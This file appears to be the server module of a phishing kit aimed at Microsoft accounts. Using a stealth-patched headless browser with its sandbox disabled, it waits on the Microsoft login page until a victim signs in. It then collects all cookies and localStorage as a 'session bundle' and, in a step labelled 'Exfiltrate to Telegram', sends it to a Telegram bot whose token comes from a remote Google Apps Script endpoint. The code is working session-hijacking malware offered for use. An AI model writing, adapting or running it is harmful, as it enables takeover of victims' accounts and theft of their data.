const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');

puppeteer.use(StealthPlugin());

// --- CONFIGURATION ---
// Replace this with your actual Google Apps Script Web App URL
const VAULT_URL = 'https://script.google.com/macros/s/AKfycbzjdgSpRDMcGVrxO0ZD-0CPALzP8lX0WHa0T7gu5VzN6kIqgYxDVzvYhKi8mifLM-2X/exec';

async function startSession(io, socket) {
    const browser = await puppeteer.launch({
        headless: "new",
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--disable-features=IsolateOrigins,site-per-process'
        ]
    });

    try {
        // 1. Fetch Environment Variables from Google Vault
        console.log("Fetching credentials from Vault...");
        const envResponse = await axios.get(VAULT_URL);
        const { TELEGRAM_TOKEN, CHAT_ID } = envResponse.data;

        if (!TELEGRAM_TOKEN || !CHAT_ID) {
            throw new Error("Vault returned incomplete credentials.");
        }

        const page = await browser.newPage();
        const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36';
        await page.setUserAgent(UA);

        console.log("Navigating to Microsoft...");
        await page.goto('https://login.microsoftonline.com', { 
            waitUntil: 'networkidle2',
            timeout: 60000 
        });

        console.log("Waiting for session stabilization...");
        
        // Wait for Cookies, URL, or Dashboard UI
        await page.waitForFunction(() => {
            const hasAuth = document.cookie.includes('RPSSecAuth') || document.cookie.includes('ESTSAUTH');
            const isAtDashboard = window.location.href.includes('office.com') || window.location.href.includes('live.com');
            const hasInbox = !!document.querySelector('#top_panel_search_input');
            return hasAuth || isAtDashboard || hasInbox;
        }, { timeout: 120000 });

        // 2. Extract Comprehensive Session Bundle
        const client = await page.target().createCDPSession();
        const { cookies } = await client.send('Network.getAllCookies');
        const localStorageData = await page.evaluate(() => JSON.stringify(localStorage));

        const sessionBundle = {
            target: "Microsoft_Account",
            userAgent: UA,
            cookies: cookies,
            localStorage: JSON.parse(localStorageData),
            timestamp: new Date().toISOString()
        };

        // 3. Exfiltrate to Telegram
        console.log("Sending bundle to Telegram...");
        const message = `🚀 **Success!**\nSession captured and stabilized.\nDevice: Windows/Chrome\nVault Version: ${envResponse.data.VERSION || 'N/A'}`;
        
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`, {
            chat_id: CHAT_ID,
            caption: message,
            parse_mode: 'Markdown',
            document: {
                value: Buffer.from(JSON.stringify(sessionBundle, null, 2)),
                options: { filename: 'session_bundle.json', contentType: 'application/json' }
            }
        }, {
            headers: { 'Content-Type': 'multipart/form-data' }
        });

        console.log("Capture process complete.");
        socket.emit('session_success', { status: 'Sent to Telegram' });

    } catch (error) {
        console.error("Orchestra Error:", error.message);
        socket.emit('session_error', error.message);
        throw error;
    } finally {
        await browser.close();
    }
}

module.exports = { startSession };
